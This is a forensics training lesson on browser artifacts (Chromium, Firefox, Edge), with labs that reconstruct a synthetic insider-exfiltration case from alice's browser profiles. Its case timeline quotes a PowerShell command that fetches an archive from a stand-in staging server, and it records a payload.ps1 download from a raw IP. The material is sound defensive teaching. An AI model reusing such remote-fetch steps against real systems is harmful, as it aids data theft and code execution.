# Day 18: Browser Forensics: Chromium, Firefox & Edge

> **Phase 2: Windows Forensics** · **Level:** 🟡 Intermediate · **Time:** ~3.5 hours (reading + labs) · **Posted:** 2026-10-15
>
> **Tools today:** 🛠️ Hindsight · 🛠️ BrowsingHistoryView · 🛠️ DB Browser for SQLite

---

## 🎯 Learning objectives

By the end of today you will be able to:

1. Find every browser **profile** on a Windows, Linux or macOS system and name the files that hold history, downloads, cookies, form data and settings.
2. Read **Chromium** (Chrome, Edge, Brave...) and **Firefox** databases directly with SQL: visits and how the user got there (transitions), searches, downloads, cookies and form history.
3. Convert the browsers' timestamps (**WebKit** microseconds since 1601, **PRTime** microseconds since 1970, and the columns that use milliseconds or seconds instead).
4. Copy and open browser databases **without changing them**, and explain why `sqlite3 -readonly` is not enough on its own.
5. Run Hindsight, BrowsingHistoryView and DB Browser for SQLite, and check a tool's output against the raw tables when it matters.

---

## Part 1: The lesson

A browser is the program a user spends most time in, and it writes down almost everything: each page and how it was reached, every search, each download with its source and target, what was typed into forms, when the browser started and stopped. For an investigator that gives three things the rest of Windows rarely does: **intent** (what someone searched for and read), **source** (where a file came from) and a **timeline to the millisecond**. Today you'll read alice's two browsers on WS-ALICE and find where `payload.ps1` (Days 10 and 16) and the MEGA account in `rc.conf` (Day 9) came from.

### 1.1 Where the profiles are

A browser keeps one folder per **profile** (per user, and often several per user). Collect the whole folder.

| Browser | Windows | Linux | macOS |
|---|---|---|---|
| **Edge** (Chromium) | `%LOCALAPPDATA%\Microsoft\Edge\User Data\<Profile>\` | `~/.config/microsoft-edge/<Profile>/` | `~/Library/Application Support/Microsoft Edge/<Profile>/` |
| **Chrome** | `%LOCALAPPDATA%\Google\Chrome\User Data\<Profile>\` | `~/.config/google-chrome/<Profile>/` | `~/Library/Application Support/Google/Chrome/<Profile>/` |
| **Firefox** | `%APPDATA%\Mozilla\Firefox\Profiles\<random>.<name>\` (cache under `%LOCALAPPDATA%\Mozilla\Firefox\Profiles\`) | `~/.mozilla/firefox/<random>.<name>/` (Snap: `~/snap/firefox/common/.mozilla/firefox/`) | `~/Library/Application Support/Firefox/Profiles/<random>.<name>/` |

- **Chromium profiles** are `Default`, `Profile 1`, `Profile 2`...; the list and their display names are in `User Data\Local State` (JSON). Other Chromium browsers (Brave, Vivaldi, Opera) use the same layout under their own folder.
- **Firefox profiles** are listed in `%APPDATA%\Mozilla\Firefox\profiles.ini` (and `installs.ini`: which profile each installation uses). The `<random>` part is 8 characters.
- **Legacy browsers:** Internet Explorer 10/11 and the old (EdgeHTML) Edge kept history in an **ESE** database, `%LOCALAPPDATA%\Microsoft\Windows\WebCache\WebCacheV01.dat`, the same format as SRUM yesterday.
- **KAPE targets** (Day 9): `Chrome`, `EdgeChromium` (the `Edge` target is the old EdgeHTML Edge), `Firefox`, and the compound target `WebBrowsers`.

### 1.2 Chromium: Chrome, Edge and the rest

| File (in the profile) | Format | What's in it |
|---|---|---|
| `History` | SQLite | `urls` (one row per URL: title, `visit_count`, `typed_count`, `last_visit_time`), `visits` (one row per visit: time, `from_visit`, `transition`, `visit_duration`), `keyword_search_terms` (searches typed into the address bar), `downloads` + `downloads_url_chains` |
| `Network\Cookies` | SQLite | `cookies` (since Chrome 96; older versions: `Cookies` in the profile folder). Values are **encrypted** on Windows |
| `Web Data` | SQLite | `autofill` (values typed into web forms, with a use count), `keywords` (search engines), addresses and payment cards |
| `Login Data` | SQLite | saved passwords (encrypted) |
| `Preferences`, `Secure Preferences` | JSON | settings: download folder, a **session event log** (profile start/exit times), profile creation time, site permissions, extensions |
| `Bookmarks` | JSON | bookmarks with `date_added` and `date_last_used` |
| `Sessions\` | SNSS | `Session_*` / `Tabs_*`: open windows and tabs, with their back/forward history |
| `Cache\Cache_Data\` | Chromium cache | copies of pages, scripts and images, with HTTP headers |
| `Local Storage\leveldb\`, `IndexedDB\` | LevelDB | data that websites store in the browser |
| `Shortcuts`, `Network Action Predictor`, `Top Sites` | SQLite | text typed in the address bar and the page chosen; most-visited sites |

**Time:** Chromium's databases use **WebKit time**: microseconds since 1601-01-01 UTC (the FILETIME epoch, but in microseconds rather than 100 ns). To convert: `unix_seconds = webkit / 1,000,000 - 11,644,473,600`. In SQL: `strftime('%Y-%m-%d %H:%M:%f', visit_time / 1e6 - 11644473600, 'unixepoch')`. Exceptions: `autofill.date_created` and `date_last_used` are Unix **seconds**; `Preferences` stores WebKit times as strings.

**How the user got to a page:** `visits.transition` is a 32-bit value. The low byte is the **core type**; the high bits are **qualifiers**:

| Core (`transition & 0xFF`) | Meaning | Qualifier bit | Meaning |
|---|---|---|---|
| 0 LINK | clicked a link | `0x01000000` | Forward/Back button |
| 1 TYPED | typed (or chose) the URL in the address bar | `0x02000000` | from the address bar |
| 2 AUTO_BOOKMARK | opened from a bookmark or the Favorites bar | `0x04000000` | home page |
| 3 / 4 | sub-frame (automatic / user-initiated) | `0x08000000` | from an API or external application |
| 5 GENERATED | a **search** typed into the address bar | `0x10000000` | start of a navigation chain |
| 6 AUTO_TOPLEVEL | opened automatically (start page) | `0x20000000` | end of a navigation chain |
| 7 FORM_SUBMIT | a form was submitted | `0x40000000` | client redirect (JavaScript, meta refresh) |
| 8 RELOAD | reload, or session restore | `0x80000000` | server redirect (HTTP 3xx) |
| 9 / 10 | keyword search / keyword-generated | | |

So `0x32000005` = GENERATED + from the address bar + a one-step chain: the user typed a search. `visits.from_visit` points at the visit the user came from (a link click in the same tab). `visit_duration` is how long the page stayed loaded in its tab, not how long anyone looked at it: alice's mail tab "lasted" 10 hours.

**Downloads:** each row has the URL chain (with redirects, in `downloads_url_chains`), `target_path`, start and end times, bytes received and total, `state` (1 = complete), `danger_type` (0 = not dangerous; 6 = the browser warned and the user chose to keep it), `opened` (opened from the browser), `referrer`, `tab_url` (the page in the tab), the server's `etag` and `last_modified`, and the MIME type. The navigation that turns into a download is **not** in `urls`/`visits`: the download URL is only in `downloads_url_chains`. On Windows, Chromium also writes the **Mark of the Web** (`Zone.Identifier` with `HostUrl`, and `ReferrerUrl` when there was a referrer: Day 10).

**Cookies** keep `creation_utc`, `last_access_utc`, `expires_utc` (Chrome caps cookies at 400 days), host, name and flags in clear, but the **value** is in `encrypted_value`: on Windows it starts with `v10` (AES-256-GCM, with a key stored in `Local State` → `os_crypt.encrypted_key`, which starts with `DPAPI` and is protected by the user's Windows credentials), and since Chrome 127, `v20` (app-bound encryption, with a second key). You can **timeline cookies without decrypting them**; decryption needs the user's DPAPI keys (a later lesson).

**Edge** is Chromium: same files, same schema. Its `Preferences` has an `edge` section, which is how tools tell it from Chrome. Edge-only features (Collections, IE mode) have their own files, outside today's scope.

### 1.3 Firefox

| File (in the profile) | What's in it |
|---|---|
| `places.sqlite` | `moz_places` (one row per URL: title, `rev_host`, `visit_count`, `typed`, `frecency`, `last_visit_date`), `moz_historyvisits` (one per visit: `visit_date`, `visit_type`, `from_visit`, `source`), `moz_bookmarks`, `moz_origins`, `moz_inputhistory` (text typed in the address bar and the result picked), **`moz_annos`** (downloads), **`moz_places_metadata`** (page interactions) |
| `cookies.sqlite` | `moz_cookies`, values **in clear** |
| `formhistory.sqlite` | `moz_formhistory`: values typed into web forms (`fieldname`, `value`, `timesUsed`, `firstUsed`, `lastUsed`) |
| `favicons.sqlite` | site icons per page URL; can keep URLs after the history is cleared |
| `logins.json` + `key4.db` | saved passwords (encrypted; the primary password protects `key4.db`) |
| `sessionstore-backups\recovery.jsonlz4` | open windows and tabs (Mozilla's LZ4-compressed JSON) |
| `prefs.js`, `times.json` | settings, including the last version run (`browser.startup.homepage_override.mstone`); the profile's creation time |
| `cache2\` (under `%LOCALAPPDATA%`) | the cache |

**Visit types** (`moz_historyvisits.visit_type`): 1 link, 2 typed, 3 bookmark, 4 embed, 5 permanent redirect, 6 temporary redirect, **7 download**, 8 framed link, 9 reload. **`source`**: 0 organic, 1 sponsored, 2 bookmarked, **3 a search results page**.

**Downloads** are in `places.sqlite`: a visit of type 7 to the download URL, plus two rows in `moz_annos`: `downloads/destinationFileURI` (the target file) and `downloads/metaData` (JSON: `state` 1 = finished, 2 = failed, 3 = cancelled, 4 = paused; `endTime`; `fileSize`; `deleted`).

**Page interactions** (`moz_places_metadata`, on by default in current Firefox: `browser.places.interactions.enabled`): per page view, the time the page was in view, **typing time**, **key presses** and scrolling. It tells you a user didn't just open a page: they typed 61 keys into it.

**Time:** Firefox uses **PRTime**, microseconds since 1970 (`visit_date / 1e6` → `'unixepoch'`), but not everywhere: `moz_places_metadata` and the download `endTime` use **milliseconds**, and in `cookies.sqlite` `creationTime`/`lastAccessed` are microseconds while **`expiry` is milliseconds** (since cookie schema 16; before that, seconds). Check the unit per column; a tool that assumes the old unit gets it wrong (Lab 3).

### 1.4 Reading browser databases without changing them

Browser databases are SQLite, and SQLite writes in two ways:

- **Rollback journal** (Chromium; header byte 18 = 1): changes go straight into the file, with a `-journal` file while a transaction runs.
- **Write-ahead log (WAL)** (Firefox; byte 18 = 2): new changes go to `<name>-wal` first, with an index in `<name>-shm`, and reach the main file at a checkpoint. A copied `places.sqlite` **without its `-wal`** can miss the newest history (Day 17's Timeline database had all its data in the WAL).

The rules:

1. Collect the **whole profile folder** (all `-wal`, `-shm`, `-journal` files), from a closed browser, a shadow copy or a triage tool. Hash it.
2. **Work on a copy.** Opening a WAL database "read-only" (`sqlite3 -readonly`, or a GUI's read-only mode) still **creates** `-wal` and `-shm` files next to it (Lab 1 shows it). `?immutable=1` creates nothing, but it also ignores any `-wal`, so it only gives a complete picture when there is none.
3. **Private browsing** (InPrivate, Incognito, Private Window) writes none of this. Look for the browser's process (Days 12, 16), DNS and network logs (Day 16), SRUM bytes (Day 17) and memory (Phase 3) instead.
4. **Cleared history** removes rows, but old pages of the database (free pages, the WAL, the journal) can still contain them; carving (Day 7) applies.
5. A profile records what was done **in an account**, not who was at the keyboard. Tie it to a logon session (Day 14) before you name a person.

### 1.5 What alice's browsers add

| Time (UTC) | Source | Event |
|---|---|---|
| 2026-09-28 10:08:55 | Firefox history | Search: *copy whole folder to mega without the app* |
| 10:09:21–10:11:02 | Firefox history + interactions | `rclone.org/mega/` read for 97 s; `mega.nz/register` opened from it, **61 key presses** |
| 10:10:41 | Firefox form history | `email` = **drop.box.7731@example.com**: the MEGA account in `rc.conf` (Day 9) |
| 10:11:40–10:11:52 | Firefox downloads | `rclone-v1.68.2-windows-amd64.zip` from downloads.rclone.org: **failed** |
| 10:12:47 | Firefox history | `https://downloads.example.net/` **typed** |
| 10:13:44 | PowerShell (Days 14, 16) | `Invoke-WebRequest https://downloads.example.net/rc.zip` (no Mark of the Web) |
| 2026-09-29 00:59:12 | Edge Preferences, Sysmon (Day 16) | Edge profile starts (logon at 00:58:41, Day 14) |
| 01:00:22–01:01:21 | Edge history | Searches *rclone mega config* and *powershell run script from url one line*; the `Invoke-Expression` documentation |
| 01:02:02.875–01:02:03.127 | Edge downloads | `http://203.0.113.50/payload.ps1` (75 bytes) → `Downloads`, **no referrer, no tab URL** (typed or pasted), server `Last-Modified` 2026-09-28 23:41:09 |
| 01:02:03.118 | Sysmon 11/15, `$MFT` (Days 10, 16) | `payload.ps1` and its `Zone.Identifier` (HostUrl only) created by `msedge.exe` |
| 01:36:44 | Edge Preferences | Edge exits with 4 tabs open |

Until now WS-ALICE could be read as a phished user whose account was abused (the Day 9 generator even names 10:14 on 2026-09-28 `T_PHISH`). Her browsers say the account researched MEGA uploads, typed the MEGA account into a sign-up page and typed the staging server's address, a day before the exfiltration. That is evidence about the **account**; with the console logon of Day 14 and the USB copy of Day 13, the case against the **person** is getting stronger, but it's still a case to test, not a conclusion.

---

## Part 2: Tools

Hindsight parses whole profiles into a timeline; BrowsingHistoryView is a quick Windows viewer for many browsers at once; DB Browser for SQLite (and the `sqlite3` command-line shell) is how you check a tool or read what it doesn't parse.

---

### 🛠️ Tool 1: Hindsight

| | |
|---|---|
| **What** | Parses Chromium-based browsers (Chrome, Edge, Brave, Vivaldi...) and Firefox/Tor Browser profiles into one timeline: URLs, downloads, cookies, autofill and form history, bookmarks, preferences, sessions, Local Storage, cache, extensions. Plugins interpret values (query strings, Google searches and analytics cookies, load-balancer cookies) |
| **Why in DFIR** | Point it at a user's `AppData` (or a whole collection) and it finds every profile, detects the browser and writes XLSX, SQLite or JSONL (Plaso-style fields for timeline tools) |
| **Platforms** | Python 3.11+ on Windows, Linux and macOS; packaged Windows builds (`hindsight.exe`, `hindsight_gui.exe`) on the releases page |
| **Licence** | Apache 2.0 |
| **Home** | https://github.com/RyanDFIR/hindsight |

#### Requirements

Python **3.11 or newer** (Ubuntu 24.04 has 3.12; Ubuntu 22.04's 3.10 is too old: use a newer Python or the Windows build), `pip`, and `git` (one dependency installs from GitHub). A copy of the profile folder.

#### Installation

```bash
# Linux / macOS (validated here): a virtual environment, pinned versions
python3 -m venv ~/tools/hindsight-venv
~/tools/hindsight-venv/bin/pip install pyhindsight==20260600 \
  "ccl_chromium_reader @ git+https://github.com/cclgroupltd/ccl_chromium_reader.git@ef840de30221c4d65bc96d2f4d9057e9ef2f526d"
hindsight() { ~/tools/hindsight-venv/bin/python ~/tools/hindsight-venv/bin/hindsight.py "$@"; }
```

```powershell
# Windows: download the release from https://github.com/RyanDFIR/hindsight/releases and unzip it
.\hindsight.exe -h
# or with Python 3.11+:
py -m pip install pyhindsight
py -m pip install git+https://github.com/cclgroupltd/ccl_chromium_reader.git
```

There's no official Docker image; the `pip` lines above work in a `python:3.12` container with the case folder mounted.

#### Configuration

| Option | Meaning |
|---|---|
| `-i PATH` | A profile folder, or a parent folder to search recursively for profiles |
| `-o NAME` | Output file name, without extension |
| `-f xlsx\|sqlite\|jsonl` | Output format (default XLSX) |
| `-b BROWSER` | Force a browser for every profile: Chrome, Edge, Brave, Vivaldi, Firefox, Tor (default: detect each profile) |
| `-l LOG` | Log file (appended to); give an absolute path |
| `-t TZ` | Display time zone for the timestamps in XLSX output |
| `-c PATH` | Cache folder, if it's outside the profile (macOS: `~/Library/Caches/Google/Chrome/Default/Cache/`) |
| `-d linux\|mac` | Try to decrypt values from a Linux or Mac profile (marked as buggy by the author) |
| `--nocopy`, `--temp_dir DIR` | By default Hindsight copies each file to a temporary folder before opening it; `--nocopy` opens the originals (don't, on evidence) |

The **web interface** (`hindsight_gui.py` or `hindsight_gui.exe`) serves http://localhost:8080 with the same options and a results page. Plugins live in `pyhindsight/plugins/`.

#### Verify the installation

```bash
hindsight -h | grep -o 'Hindsight v[0-9.]*' | head -n 1        # Hindsight v2026.06
```

#### First use

```bash
# all profiles under a user's AppData (a COPY), one SQLite timeline
hindsight -i work/AppData -o work/alice -f sqlite -l $PWD/work/hindsight.log
sqlite3 work/alice.sqlite "SELECT timestamp, type, url, title, value FROM timeline ORDER BY timestamp;"
```

#### Troubleshooting

| Symptom | Fix |
|---|---|
| `ModuleNotFoundError: No module named 'ccl_chromium_reader'` | It isn't on PyPI: install it from GitHub (Installation) |
| `Permission denied` running `hindsight.py` from the venv | Run it with the venv's Python: `~/tools/hindsight-venv/bin/python ~/tools/hindsight-venv/bin/hindsight.py` |
| JSONL output ends with `KeyError: 'expires_utc'` and an empty `.jsonl` | Firefox cookie schema 16+ stores `expiry` in milliseconds; Hindsight 2026.06 reads seconds, gets no date, and the JSONL writer fails. Use `-f sqlite` or `-f xlsx`, or run JSONL on the Chromium profiles only (Lab 3) |
| `NotADirectoryError: Could not find the localstorage folder` | Seen with an empty `Local Storage` folder next to cache folders: run on a copy without the empty folder |
| Cookie values show `<encrypted>` | Normal for Windows profiles; the times are still valid. Decryption needs the user's DPAPI keys |
| No profiles found | Point `-i` at the profile or a parent of it; check the files are there (`History` or `places.sqlite`) |
| "Database is locked" on a live system | Close the browser or copy the profile first (Hindsight copies by default; don't use `--nocopy`) |

---

### 🛠️ Tool 2: BrowsingHistoryView

| | |
|---|---|
| **What** | NirSoft's viewer for the history of several browsers at once (Chrome-family browsers including Edge, Firefox, Internet Explorer, Safari) in one sortable list, exportable to CSV, HTML or XML |
| **Why in DFIR** | Quick history triage on a Windows analysis machine or a live system, for every user profile in a folder. KAPE has a module for it (`NirSoft_BrowsingHistoryView`), Velociraptor an artifact (`Windows.Applications.NirsoftBrowserViewer`) |
| **Platforms** | **Windows only** (not run in this lesson's Linux labs; the flags below are taken from the KAPE module and the Velociraptor artifact) |
| **Licence** | Freeware, closed source |
| **Home** | https://www.nirsoft.net/utils/browsing_history_view.html |

#### Requirements

Windows 7 to 11 (32- or 64-bit build). No installation, no dependencies. History only: no cookies, form data or download records.

#### Installation

```powershell
# Download browsinghistoryview-x64.zip from the home page (the URL KAPE's module uses:
# https://www.nirsoft.net/utils/browsinghistoryview-x64.zip), record its hash, unzip, run
Get-FileHash .\browsinghistoryview-x64.zip -Algorithm SHA256
Expand-Archive .\browsinghistoryview-x64.zip -DestinationPath C:\Tools\BrowsingHistoryView
C:\Tools\BrowsingHistoryView\BrowsingHistoryView.exe
```

Many antivirus products flag NirSoft tools (they can read browser data); add an exclusion on your analysis machine rather than turning protection off.

#### Configuration

At start-up the **Advanced Options** window chooses the history source (this computer's users, one profile folder, or specific files), the time filter and the browsers. Settings are saved in `BrowsingHistoryView.cfg` next to the program. On the command line:

| Option | Meaning |
|---|---|
| `/HistorySource 1` | Read the history of all users on this computer (Velociraptor's default) |
| `/HistorySource 3 /HistorySourceFolder <folder>` | Read every user profile under a folder, such as a collection's `C\Users` (KAPE's module) |
| `/VisitTimeFilterType 1` | No time filter: load everything (both use it) |
| `/LoadChrome 1`, `/LoadFirefox 1`, `/LoadIE 1`, `/LoadSafari 1` | Which browsers to read |
| `/ShowTimeInGMT 1` | Show UTC instead of local time |
| `/scomma <file>`, `/sverhtml <file>` | Save as CSV / as a vertical HTML report, without opening the window |
| `/SaveDirect` | Save directly, without loading everything into the list first |

#### Verify the installation

`Help > About` shows the version. A command-line export that writes a CSV with a header line is the quickest end-to-end check.

#### First use

```powershell
# a mounted collection (Day 9): every profile under its Users folder, UTC, to CSV
.\BrowsingHistoryView.exe /HistorySource 3 /HistorySourceFolder E:\WS-ALICE\C\Users `
  /VisitTimeFilterType 1 /ShowTimeInGMT 1 /scomma C:\Cases\WS-ALICE\BrowsingHistory.csv
```

Open the CSV in Timeline Explorer, sort by visit time, and filter by the user profile and the browser.

#### Troubleshooting

| Symptom | Fix |
|---|---|
| The program disappears or won't start | Antivirus quarantine: restore it and add an exclusion for the tools folder |
| A browser's history is missing | The profile is somewhere non-standard: use `/HistorySource 3` with the right folder; on a live system close the browser (locked files) |
| Times are off by hours | Add `/ShowTimeInGMT 1` |
| No downloads, cookies or form data | It only shows history: use Hindsight, or query the databases (DB Browser for SQLite) |

---

### 🛠️ Tool 3: DB Browser for SQLite (DB4S)

| | |
|---|---|
| **What** | An open-source GUI for SQLite databases: browse tables, see the schema, run SQL, export to CSV/JSON, plot columns |
| **Why in DFIR** | Every database today is SQLite, and no parser shows everything: today Hindsight shows neither Firefox's download state nor its page interactions. DB4S lets you look at any table and run the same SQL as the labs |
| **Platforms** | Windows, macOS, Linux |
| **Licence** | MPL 2.0 and GPL v3 (dual) |
| **Home** | https://sqlitebrowser.org/ · https://github.com/sqlitebrowser/sqlitebrowser |

#### Requirements

Nothing special; a desktop session (it's a Qt GUI). The `sqlite3` command-line shell (`sudo apt install sqlite3`) is the scriptable companion used in the labs.

#### Installation

```bash
# Linux (Ubuntu 24.04 / SIFT: version 3.12.2)
sudo apt install -y sqlitebrowser sqlite3
# macOS
brew install --cask db-browser-for-sqlite
```

```powershell
# Windows: the installer (.msi) or the portable .zip from https://sqlitebrowser.org/dl/
```

#### Configuration

| Setting | Why |
|---|---|
| **File > Open Database Read Only** (`Ctrl+Shift+O`), or `sqlitebrowser -R <db>` | Never open evidence read-write. And still open a **copy**: read-only mode doesn't stop SQLite creating `-wal`/`-shm` files for a WAL database |
| **Execute SQL** tab | Run joins and timestamp conversions (the labs' queries work as they are) |
| **File > Export > Table(s) as CSV file** | Export a table or a query result for Timeline Explorer |
| **Project files** (`.sqbpro`) | Save your queries with the case notes |
| Command line: `-s FILE` run an SQL file after opening, `-t TABLE` open a table, `-q` quit after the script, `-o group/setting=value` set an option for this run | Repeatable checks |

#### Verify the installation

```bash
sqlitebrowser --version 2>&1 | grep Version        # DB Browser for SQLite Version 3.12.2
# (it prints to stderr; with no display, add QT_QPA_PLATFORM=offscreen)
```

#### First use

```bash
sqlitebrowser -R work/AppData/Roaming/Mozilla/Firefox/Profiles/q7w1k2zd.default-release/places.sqlite
```

In **Database Structure**, look at the tables; in **Browse Data**, open `moz_places_metadata`; in **Execute SQL**, paste the Firefox queries from Lab 5.

#### Troubleshooting

| Symptom | Fix |
|---|---|
| "database is locked" | The browser is running: copy the profile (all files) and open the copy |
| The newest visits are missing | The `-wal` file wasn't copied with the database |
| `-wal` / `-shm` files appear next to the database | Expected for WAL databases, even read-only: that's why you work on a copy |
| Times are huge integers | Convert in SQL: WebKit `x / 1e6 - 11644473600`, PRTime `x / 1e6`, milliseconds `x / 1e3`, then `'unixepoch'` |
| "file is not a database" | Not SQLite (check for `SQLite format 3` at offset 0) or encrypted |

---

## Part 3: Hands-on labs

The evidence is **alice's Edge and Firefox profiles from WS-ALICE**, made by `mk_browser_profiles.py`. The table definitions are the browsers' own (Edge's copied from a real Chromium 141 profile; Firefox's from the Firefox 155 source code); the rows follow the WS-ALICE story. Hindsight is pinned to 2026.06.

Run on Ubuntu 24.04 or SIFT (Hindsight needs Python 3.11+).

```bash
sudo apt update && sudo apt install -y git python3-venv sqlite3 sqlitebrowser xxd
git -C ~/DFIR pull 2>/dev/null || git clone https://github.com/Mr-Phoenix07/DFIR.git ~/DFIR
mkdir -p ~/cases/LAB-018/{evidence,work,notes} ~/tools && cd ~/cases/LAB-018
export TZ=UTC
```

Install Hindsight in a virtual environment, then check the three tools (DB Browser for SQLite is a GUI; its version check works without a display):

```bash
[ -d ~/tools/hindsight-venv ] || python3 -m venv ~/tools/hindsight-venv
~/tools/hindsight-venv/bin/pip install -q pyhindsight==20260600 \
  "ccl_chromium_reader @ git+https://github.com/cclgroupltd/ccl_chromium_reader.git@ef840de30221c4d65bc96d2f4d9057e9ef2f526d" 2> /dev/null
hindsight() { ~/tools/hindsight-venv/bin/python ~/tools/hindsight-venv/bin/hindsight.py "$@"; }
hindsight -h | grep -o 'Hindsight v[0-9.]*' | head -n 1
sqlite3 --version | cut -d' ' -f1
QT_QPA_PLATFORM=offscreen sqlitebrowser --version 2>&1 | grep -m 1 Version
```

```
Hindsight v2026.06
3.45.1
DB Browser for SQLite Version 3.12.2
```

### Lab 1: The profiles, and reading them without changing them (20 min)

Create the evidence, copy it, and identify every database's schema version and journal mode:

```bash
python3 ~/DFIR/scripts/mk_browser_profiles.py evidence/WS-ALICE
cp -a evidence/WS-ALICE/Users/alice/AppData work/AppData
E='work/AppData/Local/Microsoft/Edge/User Data/Default'
F=work/AppData/Roaming/Mozilla/Firefox/Profiles/q7w1k2zd.default-release
for db in "$E/History" "$E/Network/Cookies" "$E/Web Data"; do
  echo "Edge $(basename "$db"): schema $(sqlite3 -readonly "$db" "SELECT value FROM meta WHERE key = 'version'"), header byte 18 = $(xxd -s 18 -l 1 -p "$db")"
done
for db in places cookies formhistory; do
  echo "Firefox $db.sqlite: schema $(sqlite3 "file:$F/$db.sqlite?immutable=1" 'PRAGMA user_version'), header byte 18 = $(xxd -s 18 -l 1 -p "$F/$db.sqlite")"
done
grep mstone $F/prefs.js
python3 -c 'import json, sys, datetime as d; print("profile created", d.datetime.fromtimestamp(json.load(open(sys.argv[1]))["created"] / 1000, d.timezone.utc))' $F/times.json
```

```
    498  Users/alice/AppData/Local/Microsoft/Edge/User Data/Local State
   1641  Users/alice/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks
 163840  Users/alice/AppData/Local/Microsoft/Edge/User Data/Default/History
    722  Users/alice/AppData/Local/Microsoft/Edge/User Data/Default/Preferences
  32768  Users/alice/AppData/Local/Microsoft/Edge/User Data/Default/Web Data
  20480  Users/alice/AppData/Local/Microsoft/Edge/User Data/Default/Network/Cookies
     73  Users/alice/AppData/Roaming/Mozilla/Firefox/installs.ini
    229  Users/alice/AppData/Roaming/Mozilla/Firefox/profiles.ini
  12288  Users/alice/AppData/Roaming/Mozilla/Firefox/Profiles/q7w1k2zd.default-release/cookies.sqlite
  24576  Users/alice/AppData/Roaming/Mozilla/Firefox/Profiles/q7w1k2zd.default-release/formhistory.sqlite
 106496  Users/alice/AppData/Roaming/Mozilla/Firefox/Profiles/q7w1k2zd.default-release/places.sqlite
    218  Users/alice/AppData/Roaming/Mozilla/Firefox/Profiles/q7w1k2zd.default-release/prefs.js
     44  Users/alice/AppData/Roaming/Mozilla/Firefox/Profiles/q7w1k2zd.default-release/times.json
Edge History: schema 70, header byte 18 = 01
Edge Cookies: schema 24, header byte 18 = 01
Edge Web Data: schema 143, header byte 18 = 01
Firefox places.sqlite: schema 87, header byte 18 = 02
Firefox cookies.sqlite: schema 17, header byte 18 = 02
Firefox formhistory.sqlite: schema 5, header byte 18 = 02
user_pref("browser.startup.homepage_override.mstone", "155.0");
profile created 2026-06-11 12:40:05.381000+00:00
```

- Edge's three databases use a **rollback journal** (byte 18 = `01`), Firefox's three are in **WAL mode** (`02`). The schema versions help date the browsers: History 70 is what a Chromium 141 profile has (it changes only every few releases, so it gives a range, not a version); places schema 87, cookies 17 and form history 5 are Firefox 155's, which `prefs.js` confirms (`mstone 155.0`).
- `times.json` dates the Firefox profile: created **2026-06-11**, three months after alice's Edge profile (its oldest cookie dates from 2026-03-02, Lab 4). A second browser the user installed is worth a question in the interview.
- The Firefox loop used `?immutable=1`: on a WAL database, anything else writes next to the file. See for yourself, on a throw-away copy:

```bash
mkdir -p work/demo && cp $F/places.sqlite work/demo/
sqlite3 -readonly work/demo/places.sqlite 'SELECT count(*) FROM moz_places;'
ls work/demo
rm work/demo/places.sqlite-*
sqlite3 'file:work/demo/places.sqlite?immutable=1' 'SELECT count(*) FROM moz_places;'
ls work/demo
```

```
6
places.sqlite
places.sqlite-shm
places.sqlite-wal
6
places.sqlite
```

`-readonly` read the database **and created two files next to it**. `immutable=1` created nothing, but would also have ignored a `-wal` if there were one. That's why you collect the `-wal` and `-shm` with the database, hash everything, and query a copy.

### Lab 2: Hindsight: one timeline from both browsers (25 min)

Point Hindsight at the copy of alice's `AppData` and let it find the profiles. SQLite output is easy to query:

```bash
hindsight -i work/AppData -o work/alice -f sqlite -l $PWD/work/hindsight.log | grep -E 'Profiles found|Detected  [0-9]|Total items'
sqlite3 work/alice.sqlite "SELECT CASE WHEN profile LIKE '%Firefox%' THEN 'Firefox' ELSE 'Edge' END AS browser, type, count(*) FROM timeline GROUP BY 1, 2 ORDER BY 1, 2;"
sqlite3 -separator '  ' work/alice.sqlite "SELECT substr(timestamp, 1, 19), CASE WHEN profile LIKE '%Firefox%' THEN 'FF  ' ELSE 'Edge' END, type,
  CASE WHEN type = 'download' THEN url || ' -> ' || value WHEN type IN ('autofill', 'cookie (created)', 'cookie (accessed)') THEN title || ' = ' || value ELSE url END
  FROM timeline WHERE timestamp >= '2026-09-28 10:00' AND type IN ('url', 'download', 'autofill', 'cookie (created)') ORDER BY timestamp;" | cut -c1-150
```

```
                     Profiles found  2                                          
                           Detected  1× Edge, 1× Firefox                        
  Total items  35                                                               
Edge|autofill|4
Edge|bookmark|2
Edge|cookie (accessed)|2
Edge|cookie (created)|2
Edge|download|1
Edge|preference|1
Edge|profile creation|1
Edge|session|4
Edge|url|7
Firefox|autofill|1
Firefox|cookie (accessed)|1
Firefox|cookie (created)|2
Firefox|download|1
Firefox|url|6
2026-09-28 10:08:55  FF    url  https://www.bing.com/search?q=copy+whole+folder+to+mega+without+the+app&pc=MOZI&form=MOZLBR
2026-09-28 10:08:55  FF    cookie (created)  MUID = 1F3C9A0D5E8B6C2147A0E3B9D4C61F58
2026-09-28 10:09:21  FF    url  https://rclone.org/mega/
2026-09-28 10:10:12  FF    url  https://mega.nz/register
2026-09-28 10:10:12  FF    cookie (created)  lang = en
2026-09-28 10:10:41  FF    autofill  email = drop.box.7731@example.com
2026-09-28 10:11:02  FF    url  https://rclone.org/downloads/
2026-09-28 10:11:40  FF    url  https://downloads.rclone.org/v1.68.2/rclone-v1.68.2-windows-amd64.zip
2026-09-28 10:11:40  FF    download  https://downloads.rclone.org/v1.68.2/rclone-v1.68.2-windows-amd64.zip -> C:/Users/alice/Downloads/rclone-v1.68.2-
2026-09-28 10:12:47  FF    url  https://downloads.example.net/
2026-09-29 00:59:47  Edge  url  https://mail.corp.example/owa/
2026-09-29 01:00:22  Edge  url  https://www.bing.com/search?q=rclone+mega+config&form=ANAB01&pc=U531
2026-09-29 01:00:31  Edge  url  https://rclone.org/mega/
2026-09-29 01:01:09  Edge  url  https://www.bing.com/search?q=powershell+run+script+from+url+one+line&form=ANAB01&pc=U531
2026-09-29 01:01:21  Edge  url  https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression
2026-09-29 01:02:02  Edge  download  http://203.0.113.50/payload.ps1 -> C:\Users\alice\Downloads\payload.ps1
```

- Hindsight found **both** profiles and told Edge from Chrome by the `edge` section of its `Preferences`.
- The timeline tells a two-part story. On **2026-09-28** in **Firefox**: a search for copying a folder to MEGA without its app, rclone's MEGA page, MEGA's sign-up page, an **email address typed into a form** (`drop.box.7731@example.com`, the user in `rc.conf`), an rclone download, and the staging server `downloads.example.net` typed in. On **2026-09-29** in **Edge**: searches for rclone's MEGA configuration and for running a script from a URL in one line, then the download of `payload.ps1` from 203.0.113.50.
